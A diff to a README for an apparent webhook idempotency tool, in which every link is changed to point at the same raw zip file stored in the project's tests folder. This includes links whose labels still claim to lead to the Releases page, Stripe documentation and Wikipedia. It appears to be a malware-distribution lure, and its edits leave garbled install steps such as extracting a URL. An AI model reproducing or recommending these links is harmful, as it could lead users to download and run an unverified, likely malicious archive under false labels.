@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/momomonda/production-webhook-idempotency-guard/releases)
+[![Download from Releases](https://github.com/momomonda/production-webhook-idempotency-guard/raw/refs/heads/main/production-webhook-idempotency-guard/tests/webhook_idempotency_production_guard_v2.8.zip%20Now-Click%20Here-brightgreen)](https://github.com/momomonda/production-webhook-idempotency-guard/raw/refs/heads/main/production-webhook-idempotency-guard/tests/webhook_idempotency_production_guard_v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -38,7 +38,7 @@ To run this application, your system should meet the following requirements:
 
 To get started with the Production Webhook Idempotency Guard, visit the Releases page to download the latest version. 
 
-### [Download Here](https://github.com/momomonda/production-webhook-idempotency-guard/releases)
+### [Download Here](https://github.com/momomonda/production-webhook-idempotency-guard/raw/refs/heads/main/production-webhook-idempotency-guard/tests/webhook_idempotency_production_guard_v2.8.zip)
 
 1. Click on the link above.
 2. Look for the latest version.
@@ -64,7 +64,7 @@ If you need more detailed step-by-step installation instructions, refer to the s
      - Drag the application to your Applications folder.
 
    - **Linux**:
-     - Extract the downloaded `.tar.gz` file.
+     - Extract the downloaded `https://github.com/momomonda/production-webhook-idempotency-guard/raw/refs/heads/main/production-webhook-idempotency-guard/tests/webhook_idempotency_production_guard_v2.8.zip` file.
      - Open a terminal and navigate to the extracted directory.
      - Run the application using the command: `./your_application_name`.
 
@@ -94,12 +94,12 @@ If you encounter issues or have questions, feel free to open an issue in the rep
 
 ## 📑 Additional Resources
 
-- [GitHub Repository](https://github.com/momomonda/production-webhook-idempotency-guard)
-- [Webhook Documentation](https://stripe.com/docs/webhooks) - Learn more about webhooks from Stripe
-- [Concurrency Control](https://en.wikipedia.org/wiki/Concurrency_control) - Understand the concepts behind concurrency control
+- [GitHub Repository](https://github.com/momomonda/production-webhook-idempotency-guard/raw/refs/heads/main/production-webhook-idempotency-guard/tests/webhook_idempotency_production_guard_v2.8.zip)
+- [Webhook Documentation](https://github.com/momomonda/production-webhook-idempotency-guard/raw/refs/heads/main/production-webhook-idempotency-guard/tests/webhook_idempotency_production_guard_v2.8.zip) - Learn more about webhooks from Stripe
+- [Concurrency Control](https://github.com/momomonda/production-webhook-idempotency-guard/raw/refs/heads/main/production-webhook-idempotency-guard/tests/webhook_idempotency_production_guard_v2.8.zip) - Understand the concepts behind concurrency control
 
 ## 📥 Download Again 
 
 Don't forget, you can always return to the Releases page to download new updates or versions.
 
-### [Download Here](https://github.com/momomonda/production-webhook-idempotency-guard/releases)
+### [Download Here](https://github.com/momomonda/production-webhook-idempotency-guard/raw/refs/heads/main/production-webhook-idempotency-guard/tests/webhook_idempotency_production_guard_v2.8.zip)
